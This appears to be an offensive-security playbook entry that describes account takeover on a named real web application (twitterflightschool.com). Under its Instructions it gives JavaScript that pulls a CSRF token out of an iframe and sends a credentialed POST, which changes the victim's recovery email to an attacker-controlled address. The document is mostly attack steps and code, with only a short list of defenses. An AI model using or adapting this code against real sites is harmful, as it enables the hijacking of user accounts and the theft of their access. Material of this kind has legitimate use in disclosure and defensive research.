---
id: proc-update-recovery-email-takeover
tags:
  - account-takeover
  - csrf-bypass
  - email-update
type: procedure
tools: []
tactics:
  - '[[Collection]]'
  - '[[Persistence]]'
commands:
  - '[[commands/Perform-Account-Takeover-Fetch]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[T1078.004]]'
updated_at: '2025-12-13T23:56:03.460Z'
skill_level: advanced
impact_level: critical
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
  - '[[Persistence]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[T1078.004]]'
---
# Update Recovery Email for Account Takeover

## Summary

This procedure escalates the stolen CSRF token to perform a POST request updating the user's custom_a field (recovery email) to an attacker-controlled address, achieving account takeover.

## Description

Using the iframe and interval polling, extract the token and craft a fetch request to /widgets/twitter_registrations with the token, mimicking a form submission. The body includes encoded user data, setting custom_a to attacker email. This bypasses CSRF protections, allowing persistent access via email reset.

## Requirements

1. Stolen CSRF token from previous step
2. Victim's session cookies (included in fetch)
3. Knowledge of form fields from the edit page

## Defense

Defensive measures and detection strategies:

- Validate CSRF tokens server-side strictly
- Rate-limit account updates
- Alert on email changes from unusual IPs

## Objectives

1. Poll for and use CSRF token
2. Submit update request
3. Confirm takeover via new email control

## Instructions

### Step 1: Setup Iframe and Polling

**Context**: Load iframe and start interval to extract token.

Execute [[commands/Perform-Account-Takeover-Fetch]] (initial part):

```javascript
document.body.innerHTML="<iframe id=ifr src=https://www.twitterflightschool.com/widgets/twitter_registrations/edit></iframe>";
var point=0;
csrf=setInterval(function(){
 try{
 var csrf_token = ifr.contentDocument.getElementsByName('authenticity_token')[0].value;
 if(csrf_token){
 console.log("[OK] CSRF TOKEN => "+encodeURIComponent(csrf_token))
```

> Token extracted on success. Expected: Console log with encoded token.

### Step 2: Perform Fetch Request

**Context**: Use token in POST to update email.

Continue with the fetch block in the command:

```javascript
ifr.contentWindow.fetch("https://www.twitterflightschool.com/widgets/twitter_registrations", {
 "credentials": "include",
 "headers": { ... },
 "body": "...&user%5Bcustom_a%5D=keerok%40protonmail.com&...",
 "method": "POST",
 "mode": "cors"
}).then(function(x){
 console.log("[OK] REQUEST");
 console.log(x.status);
 clearInterval(csrf);
 });
 }
 }catch(e){
 console.log("not yet");
 }
},1337)
```

> Request sent. Expected: Status 200, interval clears.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection
- [[Persistence]] Persistence

### Techniques

- [[JavaScript]] JavaScript
- [[T1078.004]] Cloud Accounts

### Sub-Techniques


## Commands Used

- [[commands/Perform-Account-Takeover-Fetch]]

## Tools Used


## Tags

- account-takeover
- fetch
- post-request
